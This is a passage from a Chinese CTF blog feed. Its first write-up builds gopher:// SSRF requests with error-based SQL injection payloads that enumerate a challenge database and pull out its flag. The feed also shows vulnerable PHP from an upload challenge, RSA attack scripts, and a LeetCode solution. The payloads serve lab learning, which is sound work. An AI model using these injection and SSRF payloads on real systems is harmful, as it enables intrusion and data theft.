urllib.parse.quote(new)\nprint(\"gopher://\"+host+\"/_\"+result)\n</code></pre>\n<p>首先尝试<code>admin'</code>,<code>gopher://127.0.0.1:80/_POST%2520/index.php%2520HTTP/1.1%250D%250AHost%253A%2520127.0.0.1%253A80%250D%250AUser-Agent%253A%2520curl/7.43.0%250D%250AAccept%253A%2520%252A/%252A%250D%250AContent-Type%253A%2520application/x-www-form-urlencoded%250D%250ACookie%253A%2520this_is_your_cookie%253DYWRtaW4n%250D%250A%250D%250A</code>得到报错</p>\n<p><img data-src=\"E:\\blog\\source\\素材\\XCTF\\very_easy_sql_6.png\"></p>\n<p>那么可以知道为字符型注入，并且后面还有右括号，因为有报错提示，故尝试报错注入</p>\n<p><code>admin') and updatexml(1,concat(0x7e,version()),0x7e) #</code></p>\n<p><code>gopher://127.0.0.1:80/_POST%2520/index.php%2520HTTP/1.1%250D%250AHost%253A%2520127.0.0.1%253A80%250D%250AUser-Agent%253A%2520curl/7.43.0%250D%250AAccept%253A%2520%252A/%252A%250D%250AContent-Type%253A%2520application/x-www-form-urlencoded%250D%250ACookie%253A%2520this_is_your_cookie%253DYWRtaW4nKSBhbmQgdXBkYXRleG1sKDEsY29uY2F0KDB4N2UsdmVyc2lvbigpKSwweDdlKSAj%250D%250A%250D%250A</code></p>\n<p><img data-src=\"E:\\blog\\source\\素材\\XCTF\\very_easy_sql_7.png\"></p>\n<p>成功，然后爆数据库名</p>\n<p><code>admin') and updatexml(1,concat(0x7e,database()),0x7e) #</code></p>\n<p><code>gopher://127.0.0.1:80/_POST%2520/index.php%2520HTTP/1.1%250D%250AHost%253A%2520127.0.0.1%253A80%250D%250AUser-Agent%253A%2520curl/7.43.0%250D%250AAccept%253A%2520%252A/%252A%250D%250AContent-Type%253A%2520application/x-www-form-urlencoded%250D%250ACookie%253A%2520this_is_your_cookie%253DYWRtaW4nKSBhbmQgdXBkYXRleG1sKDEsY29uY2F0KDB4N2UsZGF0YWJhc2UoKSksMHg3ZSkgIw%253D%253D%250D%250A%250D%250A</code></p>\n<p>得到数据库名<code>secutity</code></p>\n<p><img data-src=\"E:\\blog\\source\\素材\\XCTF\\very_easy_sql_8.png\"></p>\n<p>然后爆表名，<code>admin') and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema='security')),0x7e) #</code></p>\n<p><code>gopher://127.0.0.1:80/_POST%2520/index.php%2520HTTP/1.1%250D%250AHost%253A%2520127.0.0.1%253A80%250D%250AUser-Agent%253A%2520curl/7.43.0%250D%250AAccept%253A%2520%252A/%252A%250D%250AContent-Type%253A%2520application/x-www-form-urlencoded%250D%250ACookie%253A%2520this_is_your_cookie%253DYWRtaW4nKSBhbmQgdXBkYXRleG1sKDEsY29uY2F0KDB4N2UsKHNlbGVjdCBncm91cF9jb25jYXQodGFibGVfbmFtZSkgZnJvbSBpbmZvcm1hdGlvbl9zY2hlbWEudGFibGVzIHdoZXJlIHRhYmxlX3NjaGVtYT0nc2VjdXJpdHknKSksMHg3ZSkgIw%253D%253D%250D%250A%250D%250A</code></p>\n<p>得到所有表名<code>emails,flag,referers,uagents,us</code>，猜测flag在flag表中</p>\n<p><img data-src=\"E:\\blog\\source\\素材\\XCTF\\very_easy_sql_9.png\"></p>\n<p>再爆列名,<code>admin') and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema='security' and table_name='flag')),0x7e) #</code></p>\n<p><code>gopher://127.0.0.1:80/_POST%2520/index.php%2520HTTP/1.1%250D%250AHost%253A%2520127.0.0.1%253A80%250D%250AUser-Agent%253A%2520curl/7.43.0%250D%250AAccept%253A%2520%252A/%252A%250D%250AContent-Type%253A%2520application/x-www-form-urlencoded%250D%250ACookie%253A%2520this_is_your_cookie%253DYWRtaW4nKSBhbmQgdXBkYXRleG1sKDEsY29uY2F0KDB4N2UsKHNlbGVjdCBncm91cF9jb25jYXQoY29sdW1uX25hbWUpIGZyb20gaW5mb3JtYXRpb25fc2NoZW1hLmNvbHVtbnMgd2hlcmUgdGFibGVfc2NoZW1hPSdzZWN1cml0eScgYW5kIHRhYmxlX25hbWU9J2ZsYWcnKSksMHg3ZSkgIw%253D%253D%250D%250A%250D%250A</code></p>\n<p><img data-src=\"E:\\blog\\source\\素材\\XCTF\\very_easy_sql_10.png\"></p>\n<p>得到列名只有<code>flag</code></p>\n<p>故最后得flag,<code>admin') and updatexml(1,concat(0x7e,(select flag from security.flag)),0x7e) #</code></p>\n<p><code>gopher://127.0.0.1:80/_POST%2520/index.php%2520HTTP/1.1%250D%250AHost%253A%2520127.0.0.1%253A80%250D%250AUser-Agent%253A%2520curl/7.43.0%250D%250AAccept%253A%2520%252A/%252A%250D%250AContent-Type%253A%2520application/x-www-form-urlencoded%250D%250ACookie%253A%2520this_is_your_cookie%253DYWRtaW4nKSBhbmQgdXBkYXRleG1sKDEsY29uY2F0KDB4N2UsKHNlbGVjdCBmbGFnIGZyb20gc2VjdXJpdHkuZmxhZykpLDB4N2UpICM%253D%250D%250A%250D%250A</code></p>\n<p><img data-src=\"E:\\blog\\source\\素材\\XCTF\\very_easy_sql_11.png\"></p>\n<p>得到前半31位<code>cyberpeace{d849a52446443f5d2ae6</code>，然后使用substr得到后半，<code>admin') and updatexml(1,concat(0x7e,substr((select flag from security.flag),32,64)),0x7e) #</code></p>\n<p><code>gopher://127.0.0.1:80/_POST%2520/index.php%2520HTTP/1.1%250D%250AHost%253A%2520127.0.0.1%253A80%250D%250AUser-Agent%253A%2520curl/7.43.0%250D%250AAccept%253A%2520%252A/%252A%250D%250AContent-Type%253A%2520application/x-www-form-urlencoded%250D%250ACookie%253A%2520this_is_your_cookie%253DYWRtaW4nKSBhbmQgdXBkYXRleG1sKDEsY29uY2F0KDB4N2Usc3Vic3RyKChzZWxlY3QgZmxhZyBmcm9tIHNlY3VyaXR5LmZsYWcpLDMyLDY0KSksMHg3ZSkgIw%253D%253D%250D%250A%250D%250A</code></p>\n<p><img data-src=\"E:\\blog\\source\\素材\\XCTF\\very_easy_sql_12.png\"></p>\n<p>得到<code>b707f8d69681}</code></p>\n<p>结合，得到<code>cyberpeace{d849a52446443f5d2ae6b707f8d69681}</code></p>\n",
            "tags": [
                "CTF"
            ]
        },
        {
            "id": "http://dpm12345.cn/posts/f4c079d9/",
            "url": "http://dpm12345.cn/posts/f4c079d9/",
            "title": "2023ciscn",
            "date_published": "2023-05-28T12:15:40.000Z",
            "content_html": "<h1 id=\"web\"><a class=\"anchor\" href=\"#web\">#</a> Web</h1>\n<h2 id=\"unzip\"><a class=\"anchor\" href=\"#unzip\">#</a> unzip</h2>\n<p>属于文件上传的一种，根据题目可以知道是上传压缩包文件</p>\n<p>上传一个文件后，可以看到源码</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token function\">error_reporting</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token variable\">$finfo</span> <span class=\"token operator\">=</span> <span class=\"token function\">finfo_open</span><span class=\"token punctuation\">(</span><span class=\"token constant\">FILEINFO_MIME_TYPE</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">finfo_file</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$finfo</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$_FILES</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"file\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"tmp_name\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">===</span> <span class=\"token string single-quoted-string\">'application/zip'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token function\">exec</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'cd /tmp &amp;&amp; unzip -o '</span> <span class=\"token operator\">.</span> <span class=\"token variable\">$_FILES</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"file\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"tmp_name\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token comment\">//only this!</span></pre></td></tr></tbody></table></figure><p>根据其代码逻辑，可知在上传的文件是 zip 文件时，其会自动进入到 <code>/tmp</code>  文件夹中，并自动对压缩包进行解压</p>\n<p>这里主要用到的是软连接</p>\n<h1 id=\"crypto\"><a class=\"anchor\" href=\"#crypto\">#</a> Crypto</h1>\n<h1 id=\"misc\"><a class=\"anchor\" href=\"#misc\">#</a> Misc</h1>\n<h1 id=\"reverse\"><a class=\"anchor\" href=\"#reverse\">#</a> Reverse</h1>\n<h1 id=\"pwn\"><a class=\"anchor\" href=\"#pwn\">#</a> Pwn</h1>\n",
            "tags": [
                "CTF",
                "ciscn"
            ]
        },
        {
            "id": "http://dpm12345.cn/posts/1c771f88/",
            "url": "http://dpm12345.cn/posts/1c771f88/",
            "title": "最小覆盖子串",
            "date_published": "2023-04-15T02:20:40.000Z",
            "content_html": "<p>题目链接:<span class=\"exturl\" data-url=\"aHR0cHM6Ly9sZWV0Y29kZS5jbi9wcm9ibGVtcy9taW5pbXVtLXdpbmRvdy1zdWJzdHJpbmcv\">最小覆盖子串</span></p>\n<p>题目详情:</p>\n<p><img data-src=\"/../../../post_images/%E6%9C%80%E5%B0%8F%E8%A6%86%E7%9B%96%E5%AD%90%E4%B8%B2_%E9%A2%98%E7%9B%AE%E8%AF%A6%E6%83%85.png\"></p>\n<p>这道题是一道滑动窗口，根据题目意思，要保证查找到的子串既包含<code>t</code>中所有出现的字符，同时也要保证相对应得字符在子串中出现的次数大于等于在<code>t</code>中出现的次数</p>\n<p>这里可以使用两个哈希表分别记录两字符串中各字符出现的次数，tmap记录<code>t</code>的字符出现情况，smap维护的是当前窗口内的字符出现数的字典。当要添加的字符在smap中的值小于等于tmap，那么说明此次添加是有效的，那么将correct加一，而当相等出现冗余时，则要从前面对窗口进行缩小。(当出现与首字符相等的字符时，那么就实现了另一种情况的考虑，从而遍历所有可能的子串，然后通过比较各次的长度，最终得到最小子串)</p>\n<pre><code class=\"cpp\">class Solution {\npublic:\n    string minWindow(string s, string t) {\n        unordered_map&lt;char, int&gt; tmap, smap;\n        int left = 0, correct = 0;\n        string res = s+\"1\";//加上一个新的字符是为了防止s等于t的情况，利于下面最小值的比较\n        for (int i=0; i &lt; t.size(); i++) \n            tmap[t[i]]++;\n\n        for (int right = 0; right &lt; s.size(); ++right) {\n            // smap维护的是当前窗口内的字符出现数的字典\n            ++smap[s[right]];\n            // 当前right对应s的字符是在t中出现的，并且数量上还没有达到冗余，是一次有效添加\n            if (tmap[s[right]] &gt;= smap[s[right]])\n                ++correct;\n            // 字符串最短是空串 &amp;&amp; 如果left对应的字符是冗余，那么进行右移删除\n            while (left &lt; right &amp;&amp; smap[s[left]] &gt; tmap[s[left]])\n                --smap[s[left++]];\n            if (correct == t.size()){\n                // 窗口内已经满足t串的所有字符\n                if (right - left + 1 &lt; res.size())\n                    res = s.substr(left, right - left + 1);\n            }\n\n        }\n        return res==s+\"1\"?\"\":res;\n    }\n};\n</code></pre>\n",
            "tags": [
                "滑动窗口"
            ]
        },
        {
            "id": "http://dpm12345.cn/posts/1f01c3ee/",
            "url": "http://dpm12345.cn/posts/1f01c3ee/",
            "title": "BJDCTF2020",
            "date_published": "2023-04-08T12:12:40.000Z",
            "content_html": "<h1 id=\"Crypto\"><a href=\"#Crypto\" class=\"headerlink\" title=\"Crypto\"></a>Crypto</h1><h2 id=\"easyrsa\"><a href=\"#easyrsa\" class=\"headerlink\" title=\"easyrsa\"></a>easyrsa</h2><pre><code class=\"python\">from Crypto.Util.number import getPrime,bytes_to_long\nfrom sympy import Derivative\nfrom fractions import Fraction\nfrom secret import flag\n\np=getPrime(1024)\nq=getPrime(1024)\ne=65537                                                                                                                                                     \nn=p*q\nz=Fraction(1,Derivative(arctan(p),p))-Fraction(1,Derivative(arth(q),q))\nm=bytes_to_long(flag)\nc=pow(m,e,n)\nprint(c,z,n)\n'''\noutput:\n7922547866857761459807491502654216283012776177789511549350672958101810281348402284098310147796549430689253803510994877420135537268549410652654479620858691324110367182025648788407041599943091386227543182157746202947099572389676084392706406084307657000104665696654409155006313203957292885743791715198781974205578654792123191584957665293208390453748369182333152809882312453359706147808198922916762773721726681588977103877454119043744889164529383188077499194932909643918696646876907327364751380953182517883134591810800848971719184808713694342985458103006676013451912221080252735948993692674899399826084848622145815461035\n32115748677623209667471622872185275070257924766015020072805267359839059393284316595882933372289732127274076434587519333300142473010344694803885168557548801202495933226215437763329280242113556524498457559562872900811602056944423967403777623306961880757613246328729616643032628964072931272085866928045973799374711846825157781056965164178505232524245809179235607571567174228822561697888645968559343608375331988097157145264357626738141646556353500994924115875748198318036296898604097000938272195903056733565880150540275369239637793975923329598716003350308259321436752579291000355560431542229699759955141152914708362494482\n15310745161336895413406690009324766200789179248896951942047235448901612351128459309145825547569298479821101249094161867207686537607047447968708758990950136380924747359052570549594098569970632854351825950729752563502284849263730127586382522703959893392329333760927637353052250274195821469023401443841395096410231843592101426591882573405934188675124326997277775238287928403743324297705151732524641213516306585297722190780088180705070359469719869343939106529204798285957516860774384001892777525916167743272419958572055332232056095979448155082465977781482598371994798871917514767508394730447974770329967681767625495394441\n\n'''\n</code></pre>\n<p>根据源代码，已知c,z,m</p>\n<p>而<code>z=Fraction(1,Derivative(arctan(p),p))-Fraction(1,Derivative(arctan(q),q))</code></p>\n<p>查阅资料，<code>Derivative</code>为求导操作，<code>arctan</code>和<code>arctan</code>的导数分别为$\\frac{1}{1+x^2}$,$\\frac{1}{1-x^2}$，而Fraction给出分数，故$z=p^2+q^2$</p>\n<p>因此，可以通过以下式子求解<br>$$<br>(p+q)^2 = z + 2n\\<br>故可以求得\\ p+q = \\sqrt{z+2n}\\</p>\n<p>构造\\ x^2 - (p+q)x + pq = 0，其解为\\ p和\\ q\\<br>p = \\frac{p+q+\\sqrt{(p+q)^2-4pq}}{2}\\<br>q =  \\frac{p+q-\\sqrt{(p+q)^2-4pq}}{2}(或者可以q=p+q-p)\\<br>故\\phi(n)=(p-1)*(q-1)\\<br>可以求得d，最后m=c^d\\ (mod \\ n)<br>$$</p>\n<pre><code class=\"python\">from Crypto.Util.number import long_to_bytes\nimport gmpy2\n\nc = 7922547866857761459807491502654216283012776177789511549350672958101810281348402284098310147796549430689253803510994877420135537268549410652654479620858691324110367182025648788407041599943091386227543182157746202947099572389676084392706406084307657000104665696654409155006313203957292885743791715198781974205578654792123191584957665293208390453748369182333152809882312453359706147808198922916762773721726681588977103877454119043744889164529383188077499194932909643918696646876907327364751380953182517883134591810800848971719184808713694342985458103006676013451912221080252735948993692674899399826084848622145815461035\nz = 32115748677623209667471622872185275070257924766015020072805267359839059393284316595882933372289732127274076434587519333300142473010344694803885168557548801202495933226215437763329280242113556524498457559562872900811602056944423967403777623306961880757613246328729616643032628964072931272085866928045973799374711846825157781056965164178505232524245809179235607571567174228822561697888645968559343608375331988097157145264357626738141646556353500994924115875748198318036296898604097000938272195903056733565880150540275369239637793975923329598716003350308259321436752579291000355560431542229699759955141152914708362494482\nn = 15310745161336895413406690009324766200789179248896951942047235448901612351128459309145825547569298479821101249094161867207686537607047447968708758990950136380924747359052570549594098569970632854351825950729752563502284849263730127586382522703959893392329333760927637353052250274195821469023401443841395096410231843592101426591882573405934188675124326997277775238287928403743324297705151732524641213516306585297722190780088180705070359469719869343939106529204798285957516860774384001892777525916167743272419958572055332232056095979448155082465977781482598371994798871917514767508394730447974770329967681767625495394441\n\ne = 65537\n\np_and_q,_ = gmpy2.iroot(z+2*n,2)\np = (p_and_q + gmpy2.iroot(pow(p_and_q,2)-4*n,2)[0])//2\nq = p_and_q - p\nprint(p,q)\n\nphi = (p-1)*(q-1)\n\nd = gmpy2.invert(e,phi)\nm = pow(c,d,n)\n\nprint(long_to_bytes(m))\n# BJD{Advanced_mathematics_is_too_hard!!!}\n</code></pre>\n<h2 id=\"rsaoutput\"><a href=\"#rsaoutput\" class=\"headerlink\" title=\"rsaoutput\"></a>rsaoutput</h2><p>注意到输出信息，很容易得到n相同，e不同，为共模攻击</p>\n<pre><code class=\"python\">from Crypto.Util.number import long_to_bytes\nimport gmpy2\nn1 = 21058339337354287847534107544613605305015441090508924094198816691219103399526800112802416383088995253908857460266726925615826895303377801614829364034624475195859997943146305588315939130777450485196290766249612340054354622516207681542973756257677388091926549655162490873849955783768663029138647079874278240867932127196686258800146911620730706734103611833179733264096475286491988063990431085380499075005629807702406676707841324660971173253100956362528346684752959937473852630145893796056675793646430793578265418255919376323796044588559726703858429311784705245069845938316802681575653653770883615525735690306674635167111\ne1 = 2767\n\nn2 = 21058339337354287847534107544613605305015441090508924094198816691219103399526800112802416383088995253908857460266726925615826895303377801614829364034624475195859997943146305588315939130777450485196290766249612340054354622516207681542973756257677388091926549655162490873849955783768663029138647079874278240867932127196686258800146911620730706734103611833179733264096475286491988063990431085380499075005629807702406676707841324660971173253100956362528346684752959937473852630145893796056675793646430793578265418255919376323796044588559726703858429311784705245069845938316802681575653653770883615525735690306674635167111\ne2 = 3659\n\nmessage1=20152490165522401747723193966902181151098731763998057421967155300933719378216342043730801302534978403741086887969040721959533190058342762057359432663717825826365444996915469039056428416166173920958243044831404924113442512617599426876141184212121677500371236937127571802891321706587610393639446868836987170301813018218408886968263882123084155607494076330256934285171370758586535415136162861138898728910585138378884530819857478609791126971308624318454905992919405355751492789110009313138417265126117273710813843923143381276204802515910527468883224274829962479636527422350190210717694762908096944600267033351813929448599\n\nmessage2=11298697323140988812057735324285908480504721454145796535014418738959035245600679947297874517818928181509081545027056523790022598233918011261011973196386395689371526774785582326121959186195586069851592467637819366624044133661016373360885158956955263645614345881350494012328275215821306955212788282617812686548883151066866149060363482958708364726982908798340182288702101023393839781427386537230459436512613047311585875068008210818996941460156589314135010438362447522428206884944952639826677247819066812706835773107059567082822312300721049827013660418610265189288840247186598145741724084351633508492707755206886202876227\n\n_,s,t = gmpy2.gcdext(e1,e2)\nm = gmpy2.powmod(message1,int(s),n1)*gmpy2.powmod(message2,int(t),n1) % n1\n\nprint(long_to_bytes(int(m)))\n# BJD{r3a_C0mmoN_moD@_4ttack}\n</code></pre>\n<h2 id=\"RSA\"><a href=\"#RSA\" class=\"headerlink\" title=\"RSA\"></a>RSA</h2><pre><code class=\"python\">from Crypto.Util.number import getPrime,bytes_to_long\n\nflag=open(\"flag\",\"rb\").read()\n\np=getPrime(1024)\nq=getPrime(1024)\nassert(e&lt;100000)\nn=p*q\nm=bytes_to_long(flag)\nc=pow(m,e,n)\nprint c,n\nprint pow(294,e,n)\n\np=getPrime(1024)\nn=p*q\nm=bytes_to_long(\"BJD\"*32)\nc=pow(m,e,n)\nprint c,n\n\n'''\noutput:\nn381631268825806469518166370387352035475775677163615730759454343913563615970881967332407709901235637718936184198930226303761876517101208677107311006065728014220477966000620964056616058676999878976943319063836649085085377577273214792371548775204594097887078898598463892440141577974544939268247818937936607013100808169758675042264568547764031628431414727922168580998494695800403043312406643527637667466318473669542326169218665366423043579003388486634167642663495896607282155808331902351188500197960905672207046579647052764579411814305689137519860880916467272056778641442758940135016400808740387144508156358067955215018\nn'''\n</code></pre>\n<p>根据两个n的生成方法，可以通过求两数的最大公因数，求得q，然后依次求得p1,phi，再根据e的范围，可以爆破出e，之后求得d，最后求得m</p>\n<pre><code class=\"python\">from Crypto.Util.number import long_to_bytes\nimport gmpy2\nc1 = 12641635617803746150332232646354596292707861480200207537199141183624438303757120570096741248020236666965755798009656547738616399025300123043766255518596149348930444599820675230046423373053051631932557230849083426859490183732303751744004874183062594856870318614289991675980063548316499486908923209627563871554875612702079100567018698992935818206109087568166097392314105717555482926141030505639571708876213167112187962584484065321545727594135175369233925922507794999607323536976824183162923385005669930403448853465141405846835919842908469787547341752365471892495204307644586161393228776042015534147913888338316244169120\nn1 = 13508774104460209743306714034546704137247627344981133461801953479736017021401725818808462898375994767375627749494839671944543822403059978073813122441407612530658168942987820256786583006947001711749230193542370570950705530167921702835627122401475251039000775017381633900222474727396823708695063136246115652622259769634591309421761269548260984426148824641285010730983215377509255011298737827621611158032976420011662547854515610597955628898073569684158225678333474543920326532893446849808112837476684390030976472053905069855522297850688026960701186543428139843783907624317274796926248829543413464754127208843070331063037\npow_num = 381631268825806469518166370387352035475775677163615730759454343913563615970881967332407709901235637718936184198930226303761876517101208677107311006065728014220477966000620964056616058676999878976943319063836649085085377577273214792371548775204594097887078898598463892440141577974544939268247818937936607013100808169758675042264568547764031628431414727922168580998494695800403043312406643527637667466318473669542326169218665366423043579003388486634167642663495896607282155808331902351188500197960905672207046579647052764579411814305689137519860880916467272056778641442758940135016400808740387144508156358067955215018\nc2 = 979153370552535153498477459720877329811204688208387543826122582132404214848454954722487086658061408795223805022202997613522014736983452121073860054851302343517756732701026667062765906277626879215457936330799698812755973057557620930172778859116538571207100424990838508255127616637334499680058645411786925302368790414768248611809358160197554369255458675450109457987698749584630551177577492043403656419968285163536823819817573531356497236154342689914525321673807925458651854768512396355389740863270148775362744448115581639629326362342160548500035000156097215446881251055505465713854173913142040976382500435185442521721\nn2 = 12806210903061368369054309575159360374022344774547459345216907128193957592938071815865954073287532545947370671838372144806539753829484356064919357285623305209600680570975224639214396805124350862772159272362778768036844634760917612708721787320159318432456050806227784435091161119982613987303255995543165395426658059462110056431392517548717447898084915167661172362984251201688639469652283452307712821398857016487590794996544468826705600332208535201443322267298747117528882985955375246424812616478327182399461709978893464093245135530135430007842223389360212803439850867615121148050034887767584693608776323252233254261047\n\nq = gmpy2.gcd(n1, n2)\np1 = n1 // q\np2 = n2 // q\nphi1 = (p1-1)*(q-1)\nphi2 = (p2-1)*(q-1)\nfor i in range(100000):\n    if pow(294,i,n1) == pow_num:\n        e = i\n        break\nd1 = gmpy2.invert(e,phi1)\n\nm = pow(c1,d1,n1)\n\nprint(long_to_bytes(m))\n# BJD{p_is_common_divisor}\n</code></pre>\n",
            "tags": [
                "CTF",
                "ctfshow"
            ]
        },
        {
            "id": "http://dpm12345.cn/posts/68282885/",
            "url": "http://dpm12345.cn/posts/68282885/",
            "title": "crypto",
            "date_published": "2023-04-08T12:12:40.000Z",
            "content_html": "<h2 id=\"crypto-1\"><a href=\"#crypto-1\" class=\"headerlink\" title=\"crypto 1\"></a>crypto 1</h2><h2 id=\"crypto-2\"><a href=\"#crypto-2\" class=\"headerlink\" title=\"crypto 2\"></a>crypto 2</h2><p>js,放在浏览器控制台</p>\n<h2 id=\"crypto-3\"><a href=\"#crypto-3\" class=\"headerlink\" title=\"crypto 3\"></a>crypto 3</h2><p>js颜文字加密，浏览器打开乱码，尝试下载打开(复制链接下载)，然后放入控制台</p>\n<h2 id=\"crypto-4\"><a href=\"#crypto-4\" class=\"headerlink\" title=\"crypto 4\"></a>crypto 4</h2><p>RSA密码求d</p>\n<h2 id=\"crypto-5\"><a href=\"#crypto-5\" class=\"headerlink\" title=\"crypto 5\"></a>crypto 5</h2><p>RSA密码求m</p>\n<h2 id=\"crypto-6\"><a href=\"#crypto-6\" class=\"headerlink\" title=\"crypto 6\"></a>crypto 6</h2><p>rabbit加密</p>\n<pre><code class=\"raw\">U2FsdGVkX19mGsGlfI3nciNVpWZZRqZO2PYjJ1ZQuRqoiknyHSWeQv8ol0uRZP94MqeD2xz+\n</code></pre>\n<h2 id=\"crypto-7\"><a href=\"#crypto-7\" class=\"headerlink\" title=\"crypto 7\"></a>crypto 7</h2><p>ook解密</p>\n<h2 id=\"crypto-8\"><a href=\"#crypto-8\" class=\"headerlink\" title=\"crypto 8\"></a>crypto 8</h2><p>brainfuck解密</p>\n<h2 id=\"crypto-9\"><a href=\"#crypto-9\" class=\"headerlink\" title=\"crypto 9\"></a>crypto 9</h2><p>暴力破解加密压缩包，为<code>4132</code></p>\n<p>解压后，得到文件，然后利用压缩包名字的加密方式解密</p>\n<p><span class=\"exturl\" data-url=\"aHR0cDovL3NlcnBlbnQub25saW5lLWRvbWFpbi10b29scy5jb20v\">http://serpent.online-domain-tools.com/</span></p>\n<h2 id=\"crypto-10\"><a href=\"#crypto-10\" class=\"headerlink\" title=\"crypto 10\"></a>crypto 10</h2><p>一连等于，Quoted-printable编码</p>\n<h1 id=\"crypto-11\"><a href=\"#crypto-11\" class=\"headerlink\" title=\"crypto 11\"></a>crypto 11</h1><p>MD5解密</p>\n<h2 id=\"crypto-0\"><a href=\"#crypto-0\" class=\"headerlink\" title=\"crypto 0\"></a>crypto 0</h2><p>凯撒密码</p>\n<h2 id=\"crypto-12\"><a href=\"#crypto-12\" class=\"headerlink\" title=\"crypto 12\"></a>crypto 12</h2><p>Atbash cipher(埃特巴什码)加密</p>\n<p><span class=\"exturl\" data-url=\"aHR0cDovL3d3dy5wcmFjdGljYWxjcnlwdG9ncmFwaHkuY29tL2NpcGhlcnMvY2xhc3NpY2FsLWVyYS9hdGJhc2gtY2lwaGVyLw==\">http://www.practicalcryptography.com/ciphers/classical-era/atbash-cipher/</span></p>\n<h2 id=\"crypto-13\"><a href=\"#crypto-13\" class=\"headerlink\" title=\"crypto 13\"></a>crypto 13</h2><p>base家族解密</p>\n<pre><code class=\"python\">'''\nAuthor       : zhong\nsince        : 2022-08-28 12:30:32\nLastAuthor   : zhong\nlastTime     : 2022-08-28 13:36:13\nblog         : http://dpm12345.cn/\nemail        : 1006975692@qq.com\n'''\nimport base64\nimport hashlib\nmw = ''\nwith open(\"./base.txt\", 'r', encoding='utf-8') as f:\n    mw = f.read()\n\nwhile True:\n    try:\n        res = base64.b16decode(mw)\n        mw = res.decode('utf-8')\n        print(1)\n        if \"flag\" in mw:\n            break\n    except:\n        pass\n    try:\n        res = base64.b32decode(mw)\n        mw = res.decode('utf-8')\n        print(2)\n        if \"flag\" in mw:\n            break\n    except:\n        pass\n    try:\n        res = base64.b64decode(mw)\n        mw = res.decode('utf-8')\n        print(3)\n        if \"flag\" in mw:\n            break\n\n    except:\n        pass\nprint(mw)\n</code></pre>\n<h2 id=\"crypto-14\"><a href=\"#crypto-14\" class=\"headerlink\" title=\"crypto 14\"></a>crypto 14</h2><p>得到数字以空格为分隔符转为十六进制再转为字母</p>\n<p>得到<code>3EP/3VNFFmNEAnlHD5dCMmVHD5ad9uG</code></p>\n<p>“flag”使用base64<span class=\"exturl\" data-url=\"aHR0cHM6Ly9zby5jc2RuLm5ldC9zby9zZWFyY2g/cT0lRTUlOEElQTAlRTUlQUYlODYmc3BtPTEwMDEuMjEwMS4zMDAxLjcwMjA=\">加密</span>后的字符串是 ZmxhZw== 前面的ZmxhZ不管flag后面是什么都不会改变。我们对比一下前四个字符，”Zmxh”和”3EP/“在base64表中查一下，Z和3差了30，m和E差了30。</p>\n<p>解密脚本</p>\n<pre><code class=\"python\">s= '3EP/3VNFFmNEAnlHD5dCMmVHD5ad9uG'\nt = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'\nl=\"\"\nfor i in s:\n    l += t[(t.index(i)-30)%64]\n\nif len(l)%4!=0:\n    l=l+\"=\"*(4-(len(l)%4))\nprint(l)\n</code></pre>\n<h2 id=\"easyrsa2\"><a href=\"#easyrsa2\" class=\"headerlink\" title=\"easyrsa2\"></a>easyrsa2</h2><pre><code class=\"python\">import gmpy2\nfrom Crypto.Util.number import long_to_bytes\ne = 65537\nn1 = 23686563925537577753047229040754282953352221724154495390687358877775380147605152455537988563490716943872517593212858326146811511103311865753018329109314623702207073882884251372553225986112006827111351501044972239272200616871716325265416115038890805114829315111950319183189591283821793237999044427887934536835813526748759612963103377803089900662509399569819785571492828112437312659229879806168758843603248823629821851053775458651933952183988482163950039248487270453888288427540305542824179951734412044985364866532124803746008139763081886781361488304666575456680411806505094963425401175510416864929601220556158569443747\nc1 = 1627484142237897613944607828268981193911417408064824540711945192035649088104133038147400224070588410335190662682231189997580084680424209495303078061205122848904648319219646588720994019249279863462981015329483724747823991513714172478886306703290044871781158393304147301058706003793357846922086994952763485999282741595204008663847963539422096343391464527068599046946279309037212859931303335507455146001390326550668531665493245293839009832468668390820282664984066399051403227990068032226382222173478078505888238749583237980643698405005689247922901342204142833875409505180847943212126302482358445768662608278731750064815\n\ne = 65537\nn2 = 